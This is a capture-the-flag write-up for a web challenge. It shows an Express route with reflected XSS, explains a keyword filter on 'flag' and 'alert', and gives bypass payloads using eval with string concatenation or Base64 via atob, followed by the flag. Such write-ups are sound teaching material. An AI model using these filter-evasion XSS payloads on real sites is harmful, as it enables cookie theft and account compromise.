# Alert my Flag

[日本語はこちら](./README-ja.md)

## Description

Run `alert(flag)` to win!

## Writeup

### Overview

The goal of this challenge is to execute JavaScript equivalent to `alert(flag)` via XSS, then click the "Submit this page!" button.

Let's see how the index page is rendered:

```javascript
app.get("/", async (req, res) => {

  const flag = req.cookies.flag ?? "fake_flag";

  const username = req.query.username ?? "guest";

  let result;
  if(username.includes("flag") || username.includes("alert")) {
    result = "<p>invalid input</p>";
  } else {
    result = `<h1>Hello ${username}!</h1>`
  }

  const html = `<!DOCTYPE html>
<html>
<head>
  <script>const flag="${flag}";</script>
</head>
<body>
  ${result}
  ...
</body>
</html>`;
  return res.send(html);
});
```

As you can see, the `username` query parameter is embedded directly into HTML, which allows XSS.

However, directly using `<script>alert(flag)</script>` does not work because of this filter:

```javascript
if(username.includes("flag") || username.includes("alert")) {
  result = "<p>invalid input</p>";
}
```

This can be bypassed in many ways. One obvious approach is to use `eval`, which executes arbitrary JavaScript from a string:

```javascript
eval('ale'+'rt(fl'+'ag)')
```

Another method is to combine `eval` with `atob`. The `atob` function decodes Base64.

```javascript
eval(atob('YWxlcnQoZmxhZyk='))
```

The latter is overkill for this challenge, but it is useful when bypassing stricter filters or when sending longer and more complex JavaScript.


## Flag

`Alpaca{n0w_c4n_U_send_fl4g_t0_ur_s3rver_d1rectly?}`
